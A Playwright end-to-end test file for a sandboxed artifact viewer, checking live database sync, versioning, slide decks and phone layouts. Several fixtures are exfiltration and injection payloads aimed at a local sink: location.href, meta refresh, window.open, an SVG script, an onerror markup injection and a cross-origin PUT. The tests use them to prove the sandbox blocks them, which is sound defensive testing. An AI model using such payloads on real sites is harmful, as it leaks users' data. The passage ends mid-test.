import assert from 'node:assert/strict'
import { existsSync, mkdtempSync, rmSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { createServer, type Server } from 'node:http'
import { after, before, test } from 'node:test'
import { serve, type ServerType } from '@hono/node-server'
import { chromium, type Browser } from 'playwright-core'
import { createAppServer } from '../src/app-server.ts'
import { ArtifactStore } from '../src/artifact-store.ts'
import { createContentServer } from '../src/content-server.ts'

// Set CHROMIUM_PATH, or keep a Playwright headless shell in its default cache.
function findChromium(): string | undefined {
  if (process.env.CHROMIUM_PATH) return process.env.CHROMIUM_PATH
  const candidates = [
    join(homedir(), 'Library/Caches/ms-playwright/chromium_headless_shell-1248/chrome-headless-shell-mac-arm64/chrome-headless-shell'),
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser'
  ]
  return candidates.find((path) => existsSync(path))
}

const chromiumPath = findChromium()
const TOKEN = 'e2e-token-0123456789'
const APP_PORT = 18790
const CONTENT_PORT = 18791
const SINK_PORT = 18799
let dir: string
let store: ArtifactStore
let servers: ServerType[] = []
let browser: Browser

const PAGE = `<!doctype html><html><head><title>Bridge</title></head><body>
<p id="count">?</p><p id="upload"></p><p id="leak">no</p>
<script>
const count = document.getElementById('count')
async function refresh() { const doc = await artifact.db.get('c', 'main'); count.textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
window.bump = async () => { const doc = await artifact.db.get('c', 'main'); await artifact.db.set('c', 'main', { n: (doc?.data?.n ?? 0) + 1 }) }
window.upload = async () => { const asset = await artifact.uploads.put(new Blob(['hi']), 'note.txt'); document.getElementById('upload').textContent = asset.url }
fetch('http://localhost:${APP_PORT}/api/artifacts').then(() => { document.getElementById('leak').textContent = 'yes' }, () => {})
</script></body></html>`

before(async () => {
  if (!chromiumPath) return
  dir = mkdtempSync(join(tmpdir(), 'artifacts-e2e-'))
  store = new ArtifactStore(dir)
  const config = {
    dataDir: dir,
    appPort: APP_PORT,
    contentPort: CONTENT_PORT,
    appOrigin: `http://localhost:${APP_PORT}`,
    contentOrigin: `http://127.0.0.1:${CONTENT_PORT}`,
    tokens: [TOKEN]
  }
  servers = [
    serve({ fetch: createAppServer(store, config).fetch, port: APP_PORT, hostname: '127.0.0.1' }),
    serve({ fetch: createContentServer(store, config).fetch, port: CONTENT_PORT, hostname: '127.0.0.1' })
  ]
  browser = await chromium.launch({ executablePath: chromiumPath })
})

after(async () => {
  if (!chromiumPath) return
  await browser.close()
  for (const server of servers) server.close()
  store.close()
  rmSync(dir, { recursive: true, force: true })
})

test('a sandboxed page reaches its capabilities only through the viewer, live across viewers', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Bridge', capabilities: ['db', 'uploads'], files: { 'index.html': { content: Buffer.from(PAGE) } } })
  const first = await browser.newPage()
  const second = await browser.newPage()
  await first.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await second.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frameOf = (page: typeof first) => page.frameLocator('#frame')

  await frameOf(first).locator('#count').filter({ hasText: '0' }).waitFor()
  await frameOf(second).locator('#count').filter({ hasText: '0' }).waitFor()
  const pageFrame = first.frames().find((frame) => frame.url().includes(`:${CONTENT_PORT}/`))
  assert.ok(pageFrame)
  assert.equal(await pageFrame.evaluate(() => origin), 'null')

  await pageFrame.evaluate(() => (window as unknown as { bump: () => Promise<void> }).bump())
  // The other viewer learns of the write over the event stream, not by polling.
  await frameOf(second).locator('#count').filter({ hasText: '1' }).waitFor({ timeout: 5000 })

  await pageFrame.evaluate(() => (window as unknown as { upload: () => Promise<void> }).upload())
  await frameOf(first).locator('#upload').filter({ hasText: `/a/${id}/assets/` }).waitFor()
  assert.equal(store.listAssets(id)[0]?.source, 'page')

  assert.equal(await frameOf(first).locator('#leak').textContent(), 'no')
})

async function listenSink(): Promise<{ hits: string[]; server: Server }> {
  const hits: string[] = []
  const server = createServer((req, res) => {
    hits.push(req.url ?? '')
    res.end('<!doctype html><title>sink</title><script>window.addEventListener("message", () => {})</script>')
  })
  await new Promise<void>((resolve) => server.listen(SINK_PORT, '127.0.0.1', resolve))
  return { hits, server }
}

const EXFIL_PAGES: Record<string, string> = {
  'location.href': `<script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script>`,
  'meta refresh': `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:${SINK_PORT}/leak?d=secret">`,
  'window.open': `<button id="go" onclick="window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret')">go</button><script>window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret'); document.getElementById('go').click()</script>`
}

for (const [name, body] of Object.entries(EXFIL_PAGES)) {
  test(`a sandboxed page cannot send data out by navigation (${name})`, { skip: !chromiumPath && 'no Chromium found' }, async () => {
    const sink = await listenSink()
    try {
      const { id } = store.publish({ title: 'Exfil', capabilities: ['db'], files: { 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body>${body}</body></html>`) } } })
      const context = await browser.newContext()
      const page = await context.newPage()
      await page.goto(`http://localhost:${APP_PORT}/a/${id}`)
      await page.waitForTimeout(1500)
      assert.deepEqual(sink.hits, [])
      assert.equal(context.pages().length, 1)
      assert.ok(page.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
      await context.close()
    } finally {
      sink.server.close()
    }
  })
}

test('an artifact page cannot load another artifact\'s files', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const other = store.publish({ title: 'Other', files: { 'index.html': { content: Buffer.from('x') }, 'data.js': { content: Buffer.from("window.STOLEN = 'yes'") } } })
  const page = `<!doctype html><html><head></head><body><p id="seen">no</p>
<script src="http://127.0.0.1:${CONTENT_PORT}/a/${other.id}/v/1/data.js"></script>
<script>document.getElementById('seen').textContent = typeof window.STOLEN === 'undefined' ? 'no' : 'yes'</script></body></html>`
  const { id } = store.publish({ title: 'Mine', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#seen').waitFor()
  assert.equal(await viewer.frameLocator('#frame').locator('#seen').textContent(), 'no')
  await viewer.close()
})

test('a rendered page opened top-level on the content origin is sent back into the viewer, not left free to navigate out', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const sink = await listenSink()
  try {
    const page = `<!doctype html><html><head></head><body><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=' + encodeURIComponent(document.title)</script></body></html>`
    const { id } = store.publish({ title: 'Direct', files: { 'index.html': { content: Buffer.from(page) } } })
    const context = await browser.newContext()
    const tab = await context.newPage()
    await tab.goto(`http://127.0.0.1:${CONTENT_PORT}/a/${id}/v/1/`)
    await tab.waitForTimeout(1500)
    // The viewer drops ?v= for the latest version.
    assert.equal(tab.url(), `http://localhost:${APP_PORT}/a/${id}`)
    assert.ok(tab.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
    assert.deepEqual(sink.hits, [])
    await context.close()
  } finally {
    sink.server.close()
  }
})

test('links between pages of one artifact navigate inside the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({
    title: 'Multi',
    files: {
      'index.html': { content: Buffer.from('<!doctype html><html><head></head><body><a id="next" href="other.html">next</a></body></html>') },
      'other.html': { content: Buffer.from('<!doctype html><html><head></head><body><p id="here">other page</p></body></html>') }
    }
  })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#next').click()
  await viewer.frameLocator('#frame').locator('#here').waitFor()
  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/other.html')))
  // The address bar follows the reader, so 複製連結 and a reload land on the page they are reading.
  await viewer.waitForURL(`http://localhost:${APP_PORT}/a/${id}?path=other.html`)
  await viewer.close()
})

test('a new version keeps the reader on the same file and scroll position', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const tall = (marker: string) => `<!doctype html><html><head></head><body><p id="here">${marker}</p><div style="height:5000px"></div></body></html>`
  const { id } = store.publish({
    title: 'Keep place',
    files: {
      'index.html': { content: Buffer.from('<!doctype html><html><head></head><body><a id="next" href="guide/other.html">next</a></body></html>') },
      'guide/other.html': { content: Buffer.from(tall('v1')) }
    }
  })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1000, height: 700 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('#next').click()
  await frame.locator('#here').filter({ hasText: 'v1' }).waitFor()
  const pageFrame = () => viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  await pageFrame().evaluate(() => scrollTo(0, 1200))
  await viewer.waitForTimeout(500)

  store.update(id, { files: { 'guide/other.html': { content: Buffer.from(tall('v2')) } } })
  await frame.locator('#here').filter({ hasText: 'v2' }).waitFor({ timeout: 5000 })
  assert.ok(pageFrame().url().endsWith('/v/2/guide/other.html'), pageFrame().url())
  await pageFrame().waitForFunction(() => Math.abs(scrollY - 1200) < 5, undefined, { timeout: 5000 })

  // A version without that file falls back to the entry instead of a 404.
  store.update(id, { files: { 'guide/other.html': null } })
  await frame.locator('#next').waitFor({ timeout: 5000 })
  assert.ok(pageFrame().url().includes('/v/3/'), pageFrame().url())
  await viewer.close()
})

test('a viewer that lost its event stream catches up on reconnect without reloading the page', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = `<!doctype html><html><head></head><body><input id="draft"><p id="value">?</p>
<script>
async function refresh() { const doc = await artifact.db.get('c', 'main'); document.getElementById('value').textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
</script></body></html>`
  const { id } = store.publish({ title: 'Resync', capabilities: ['db'], files: { 'index.html': { content: Buffer.from(page) } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('#value').filter({ hasText: '0' }).waitFor()
  await frame.locator('#draft').fill('typed before the drop')

  // Offline emulation alone leaves the open stream half-alive; dropping the sockets is what a sleeping phone looks like to the server.
  await context.setOffline(true)
  const appServer = servers[0]
  if ('closeAllConnections' in appServer) appServer.closeAllConnections()
  store.setDoc(id, 'c', 'main', { n: 7 }, false)
  await viewer.waitForTimeout(1000)
  await context.setOffline(false)

  await frame.locator('#value').filter({ hasText: '7' }).waitFor({ timeout: 8000 })
  assert.equal(await frame.locator('#draft').inputValue(), 'typed before the drop')
  await context.close()
})

test('the viewer bar fits phone widths without horizontal scroll and leaves the title room', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const title = '季度營運回顧與下一季的重點工作清單'
  const { id } = store.publish({ title, icon: '📊', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi</p>') } } })
  // A second version shows the ± button, the widest the bar gets without page errors.
  store.update(id, { files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi 2</p>') } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  for (const width of [320, 375, 414, 1280]) {
    await viewer.setViewportSize({ width, height: 700 })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.locator('#changes').waitFor()
    const metrics = await viewer.evaluate(() => {
      const el = document.getElementById('title')!
      return { scroll: document.documentElement.scrollWidth, inner: innerWidth, titleWidth: el.getBoundingClientRect().width, clipped: el.scrollWidth > el.clientWidth }
    })
    assert.ok(metrics.scroll <= metrics.inner, `${width}px overflows: ${metrics.scroll} > ${metrics.inner}`)
    if (width <= 414) assert.ok(metrics.titleWidth >= 220, `${width}px title only ${metrics.titleWidth}px wide`)
    if (width >= 375) assert.equal(metrics.clipped, false, `${width}px title is cut off`)
  }
  await context.close()
})

const SVG_EXFIL = `<svg xmlns="http://www.w3.org/2000/svg"><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script><rect width="10" height="10"/></svg>`

test('an SVG opened top-level on the content origin cannot navigate out, as a version file or as an asset', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const sink = await listenSink()
  try {
    const { id } = store.publish({ title: 'Svg', files: { 'index.html': { content: Buffer.from('<p>x</p>') }, 'x.svg': { content: Buffer.from(SVG_EXFIL) } } })
    const asset = store.addAsset(id, 'x.svg', Buffer.from(SVG_EXFIL), 'publisher')
    const context = await browser.newContext()
    for (const path of [`/a/${id}/v/1/x.svg`, `/a/${id}/assets/${asset.id}/x.svg`]) {
      const tab = await context.newPage()
      await tab.goto(`http://127.0.0.1:${CONTENT_PORT}${path}`)
      await tab.waitForTimeout(1000)
      assert.equal(tab.url(), `http://127.0.0.1:${CONTENT_PORT}${path}`)
      assert.deepEqual(sink.hits, [], path)
      await tab.close()
    }
    await context.close()
  } finally {
    sink.server.close()
  }
})

test('an SVG still renders as an image and in the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="red"/></svg>'
  const page = '<!doctype html><html><head></head><body><img id="pic" src="x.svg"></body></html>'
  const { id } = store.publish({ title: 'Img', files: { 'index.html': { content: Buffer.from(page) }, 'x.svg': { content: Buffer.from(svg) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const pic = viewer.frameLocator('#frame').locator('#pic')
  await pic.waitFor()
  await viewer.waitForFunction(() => (document.getElementById('frame') as HTMLIFrameElement).contentWindow !== null)
  assert.equal(await pic.evaluate((el) => (el as HTMLImageElement).naturalWidth), 10)
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?path=x.svg`)
  await viewer.waitForTimeout(500)
  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/x.svg')))
  await viewer.close()
})

test('the phone viewer fits the viewport and its comments panel can always be closed', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: '手機留言', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi</p>') } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  for (const [width, height] of [[375, 700], [320, 640]]) {
    await viewer.setViewportSize({ width, height })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.locator('#title').waitFor({ state: 'attached' })
    const size = () => viewer.evaluate(() => ({ sh: document.documentElement.scrollHeight, ih: innerHeight, sw: document.documentElement.scrollWidth, iw: innerWidth }))
    const fits = async (when: string) => {
      const m = await size()
      assert.ok(m.sh <= m.ih, `${width}px ${when}: page ${m.sh} taller than viewport ${m.ih}`)
      assert.ok(m.sw <= m.iw, `${width}px ${when}: page ${m.sw} wider than viewport ${m.iw}`)
    }
    await fits('closed')
    const panel = viewer.locator('#comments')
    await viewer.locator('#toggle-comments').click()
    await panel.waitFor({ state: 'visible' })
    await fits('open')
    await viewer.locator('#toggle-comments').click({ timeout: 3000 })
    await panel.waitFor({ state: 'hidden' })
    await viewer.locator('#toggle-comments').click()
    await panel.waitFor({ state: 'visible' })
    await viewer.locator('#close-comments').click({ timeout: 3000 })
    await panel.waitFor({ state: 'hidden' })
    assert.equal(await viewer.locator('#toggle-comments').getAttribute('aria-expanded'), 'false')
  }
  await context.close()
})

test('a viewer on an older version still re-reads db after a reconnect when a newer version appeared meanwhile', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = `<!doctype html><html><head></head><body><p id="value">?</p>
<script>
async function refresh() { const doc = await artifact.db.get('c', 'main'); document.getElementById('value').textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
</script></body></html>`
  const files = { 'index.html': { content: Buffer.from(page) } }
  const { id } = store.publish({ title: 'Old', capabilities: ['db'], files })
  store.update(id, { files: { 'index.html': { content: Buffer.from(page + '<!--2-->') } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?v=1`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('#value').filter({ hasText: '0' }).waitFor()

  await context.setOffline(true)
  const appServer = servers[0]
  if ('closeAllConnections' in appServer) appServer.closeAllConnections()
  store.setDoc(id, 'c', 'main', { n: 9 }, false)
  store.update(id, { files: { 'index.html': { content: Buffer.from(page + '<!--3-->') } } })
  await viewer.waitForTimeout(1000)
  await context.setOffline(false)

  await frame.locator('#value').filter({ hasText: '9' }).waitFor({ timeout: 8000 })
  assert.match(viewer.url(), /v=1/)
  await context.close()
})

test('errors a page hits reach the error log and the viewer badge', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = `<!doctype html><html><head></head><body><img src="missing.png">
<script>fetch('https://example.invalid/x').catch(() => {}); setTimeout(() => { throw new Error('boom from page') })</script></body></html>`
  const { id } = store.publish({ title: 'Errors', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const badge = viewer.locator('#errors')
  await badge.filter({ hasText: '3' }).waitFor({ timeout: 5000 })
  const kinds = store.listErrors(id, 1).map((e) => `${e.kind}:${e.path}`).sort()
  assert.deepEqual(kinds, ['csp:index.html', 'error:index.html', 'resource:index.html'])
  assert.match(store.listErrors(id, 1).find((e) => e.kind === 'csp')?.message ?? '', /connect-src/)
  assert.match(store.listErrors(id, 1).find((e) => e.kind === 'error')?.source ?? '', /^index\.html:\d+:\d+$/)
  await badge.click()
  await viewer.locator('#error-list').filter({ hasText: 'boom from page' }).waitFor()

  // A clean page shows no badge.
  const clean = store.publish({ title: 'Clean', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p id="ok">ok</p>') } } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${clean.id}`)
  await viewer.frameLocator('#frame').locator('#ok').waitFor()
  await viewer.waitForTimeout(500)
  assert.equal(await badge.isVisible(), false)
  await viewer.close()
})

test('markdown shows mermaid diagrams in the sandbox and its table of contents jumps within the page', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = `# 圖\n\n## 第一節\n\n\`\`\`mermaid\nflowchart LR\n  A[寫檔] --> B[發布]\n\`\`\`\n\n## 第二節\n\n${'段落\n\n'.repeat(200)}## 第三節\n\n結尾\n`
  const { id } = store.publish({ title: 'Mermaid', files: { 'index.md': { content: Buffer.from(md) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1280, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('figure.diagram svg').waitFor({ timeout: 10000 })
  assert.match(await frame.locator('figure.diagram svg').innerHTML(), /寫檔/)
  await frame.locator('nav.toc a[href="#第三節"]').click()
  const pageFrame = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  await pageFrame.waitForFunction(() => scrollY > 1000)
  assert.equal(await pageFrame.evaluate(() => decodeURIComponent(location.hash)), '#第三節')
  assert.deepEqual(store.listErrors(id, 1), [])
  await viewer.close()
})

test('a page cannot load other files from the shared /_/ path', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = '<!doctype html><html><head></head><body><p id="r">?</p><script src="/_/markdown.css" onerror="document.getElementById(\'r\').textContent = \'blocked\'" onload="document.getElementById(\'r\').textContent = \'loaded\'"></script></body></html>'
  const { id } = store.publish({ title: 'Shared', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#r').filter({ hasText: 'blocked' }).waitFor({ timeout: 5000 })
  await viewer.close()
})

test('a viewer on a version that gets pruned moves to the current one', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = (n: number) => ({ 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body><p id="n">v${n}</p></body></html>`) } })
  const { id } = store.publish({ title: 'Prune', files: page(1) })
  store.update(id, { files: page(2) })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?v=1`)
  await viewer.frameLocator('#frame').locator('#n').filter({ hasText: 'v1' }).waitFor()
  store.prune(id, 1)
  await viewer.frameLocator('#frame').locator('#n').filter({ hasText: 'v2' }).waitFor({ timeout: 5000 })
  assert.deepEqual(await viewer.locator('#version option').allTextContents(), ['v2 · 最新'])
  await viewer.close()
})

test('gallery search finds page text and shows the hit as text, never markup', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = '# 搜尋\n\n倉庫驗貨 &lt;img src=x onerror="document.title=\'pwned\'"&gt; 流程\n'
  store.publish({ title: 'Search', files: { 'index.md': { content: Buffer.from(md) } } })
  const gallery = await browser.newPage()
  await gallery.goto(`http://localhost:${APP_PORT}/`)
  await gallery.locator('#search').fill('驗貨')
  const snippet = gallery.locator('.card-snippet').filter({ hasText: '倉庫驗貨' })
  await snippet.waitFor({ timeout: 5000 })
  assert.equal(await snippet.locator('mark').textContent(), '驗貨')
  assert.equal(await snippet.locator('img').count(), 0)
  assert.notEqual(await gallery.title(), 'pwned')
  await gallery.close()
})

test('a reader sees what a new version changed, from the update notice or the ± button', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = (end: string) => `# 版本\n\n${Array.from({ length: 12 }, (_, i) => `第 ${i} 段`).join('\n\n')}\n\n${end}\n`
  const { id } = store.publish({ title: 'Diff', files: { 'index.md': { content: Buffer.from(md('舊結論')) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 375, height: 700 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('h1').waitFor()
  assert.equal(await viewer.locator('#changes').isVisible(), false)
  store.update(id, { label: '改結論', files: { 'index.md': { content: Buffer.from(md('<新結論>')) } } })
  await viewer.locator('#toast-action').filter({ hasText: '看變更' }).click({ timeout: 5000 })
  const dialog = viewer.locator('#diff-dialog')
  await dialog.locator('.diff-lines .add').filter({ hasText: '+ <新結論>' }).waitFor()
  assert.equal(await dialog.locator('.diff-lines .del').textContent(), '- 舊結論')
  assert.match(await viewer.locator('#diff-meta').textContent() ?? '', /改結論/)
  const width = await viewer.evaluate(() => document.documentElement.scrollWidth)
  assert.ok(width <= 375, `dialog overflows: ${width}`)
  await viewer.locator('#close-diff').click()
  await viewer.locator('#changes').click()
  await dialog.waitFor({ state: 'visible' })
  await viewer.close()
})

const DECK = ['# Deck', 'by me', '???', 'opening words', '---', '## Two', '- a', '---', '## Three', 'text'].join('\n')

test('a slide deck turns pages from keys in or outside the frame, and a new version opens on the same slide', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active#slide-1').waitFor()
  // The viewer has focus, not the frame: it forwards the arrow key.
  await viewer.keyboard.press('ArrowRight')
  await frame.locator('.slide.active#slide-2').waitFor()
  assert.equal(await frame.locator('#deck-counter').textContent(), '2 / 3')
  await viewer.waitForFunction(() => location.hash === '#2')
  await frame.locator('[data-deck="notes"]').click()
  await frame.locator('[data-deck="prev"]').click()
  assert.equal(await frame.locator('#deck-notes').textContent(), 'opening words\n')
  await frame.locator('[data-deck="next"]').click()
  await frame.locator('[data-deck="next"]').click()
  await frame.locator('.slide.active#slide-3').waitFor()

  store.update(id, { files: { 'index.slides.md': { content: Buffer.from(DECK.replace('text', 'changed')) } } })
  await frame.locator('.slide.active#slide-3', { hasText: 'changed' }).waitFor({ timeout: 5000 })

  // The overview shows every slide; picking one goes there.
  await frame.locator('[data-deck="overview"]').click()
  await frame.locator('#slide-1').click()
  await frame.locator('body:not(.overview) .slide.active#slide-1').waitFor()
  await viewer.close()

  // A link to slide 2 opens on slide 2.
  const linked = await browser.newPage()
  await linked.goto(`http://localhost:${APP_PORT}/a/${id}#2`)
  await linked.frameLocator('#frame').locator('.slide.active#slide-2').waitFor()
  await linked.close()
})

test('a slide that cannot fit even with smaller text is reported to the error log', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const long = Array.from({ length: 60 }, (_, i) => `- item ${i}`).join('\n')
  const { id } = store.publish({ title: 'Overflow', files: { 'index.slides.md': { content: Buffer.from(`## Fine\n---\n## Too much\n${long}`) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.locator('#errors:not([hidden])').waitFor({ timeout: 5000 })
  const errors = store.listErrors(id, 1)
  assert.equal(errors.length, 1)
  assert.match(errors[0].message, /第 2 頁內容太多/)
  await viewer.close()
})

test('a deck fits a phone: one slide in view, controls without horizontal scroll', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Phone deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage({ viewport: { width: 375, height: 740 }, hasTouch: true })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  const page = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  const fit = await page.evaluate(() => {
    const slide = document.querySelector('.slide.active')!.getBoundingClientRect()
    const bar = document.querySelector('.deck-bar')!
    return { slideWidth: slide.width, innerWidth, barOverflow: bar.scrollWidth > bar.clientWidth, docOverflow: document.documentElement.scrollWidth > innerWidth }
  })
  assert.ok(fit.slideWidth <= fit.innerWidth && fit.slideWidth > fit.innerWidth * 0.8, JSON.stringify(fit))
  assert.equal(fit.barOverflow, false)
  assert.equal(fit.docOverflow, false)
  await viewer.close()
})

test('the deck editor previews a draft live, saves it as a version, and stays on the slide', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Edit deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1300, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  await viewer.click('#edit')
  const source = viewer.locator('#editor-source')
  await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('## Three'))
  // Typing on slide three's source shows slide three with the draft, before anything is saved.
  await source.evaluate((el: HTMLTextAreaElement) => {
    el.focus()
    el.setSelectionRange(el.value.length, el.value.length)
  })
  await viewer.keyboard.type(' draft-words')
  await frame.locator('.slide.active#slide-3', { hasText: 'draft-words' }).waitFor({ timeout: 5000 })
  assert.equal(store.requireSummary(id).currentVersion, 1)

  await viewer.keyboard.press('ControlOrMeta+s')
  await viewer.locator('#editor-status', { hasText: '已存成 v2' }).waitFor({ timeout: 5000 })
  assert.match(store.blobs.read(store.requireVersion(id, 2).files['index.slides.md'].sha256).toString(), /text draft-words$/)
  await viewer.waitForFunction(() => document.querySelector<HTMLIFrameElement>('#frame')!.src.includes('/v/2/'))
  await frame.locator('.slide.active#slide-3', { hasText: 'draft-words' }).waitFor({ timeout: 5000 })

  // Someone else saves while this viewer has an unsaved draft: the draft stays, saving reports the conflict.
  await viewer.keyboard.type(' mine')
  store.update(id, { files: { 'index.slides.md': { content: Buffer.from(DECK + '\n---\n## Theirs') } } })
  await viewer.locator('#toast', { hasText: '還沒儲存' }).waitFor({ timeout: 5000 })
  assert.match(await source.inputValue(), /draft-words mine$/)
  viewer.once('dialog', (dialog) => dialog.dismiss())
  await viewer.click('#save-deck')
  await viewer.locator('#editor-status', { hasText: '別人已存了新版本' }).waitFor({ timeout: 5000 })
  assert.equal(store.requireSummary(id).currentVersion, 3)
  await viewer.close()
})

test('no other origin can save a deck through the viewer route', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Guarded deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${CONTENT_PORT}/healthz`)
  const outcome = await page.evaluate(async (url) => {
    try {
      const response = await fetch(url, {
        method: 'PUT',
        headers: { 'content-type': 'application/json', 'x-artifact-client': 'viewer' },
        body: JSON.stringify({ markdown: '# pwned', baseVersion: 1 })
      })
      return `status ${response.status}`
    } catch (error) {
      return `blocked: ${(error as Error).name}`
    }
  }, `http://localhost:${APP_PORT}/api/artifacts/${id}/slides`)
  assert.match(outcome, /^blocked/)
  assert.equal(store.requireSummary(id).currentVersion, 1)
  await page.close()
})

test('on a phone the deck editor sits under the slide, both in view, without horizontal scroll', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Phone edit', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage({ viewport: { width: 375, height: 740 } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('.slide.active').waitFor()
  await viewer.click('#edit')
  await viewer.locator('#editor-source').waitFor()
  const layout = await viewer.evaluate(() => {
    const box = (selector: string) => document.querySelector(selector)!.getBoundingClientRect()
    return { frame: box('#frame'), editor: box('#editor'), overflow: document.documentElement.scrollWidth > innerWidth, height: innerHeight }
  })
  assert.equal(layout.overflow, false)
  assert.ok(layout.frame.height > 150 && layout.editor.top >= layout.frame.bottom - 1, JSON.stringify(layout))
  assert.ok(layout.editor.bottom <= layout.height + 1 && layout.editor.height > 200, JSON.stringify(layout))
  await viewer.close()
})

test('a deck prints one slide per page, and the toolbar offers it as .pptx', { skip: !chromiumPath && 'no Chromium found' }, async () => {
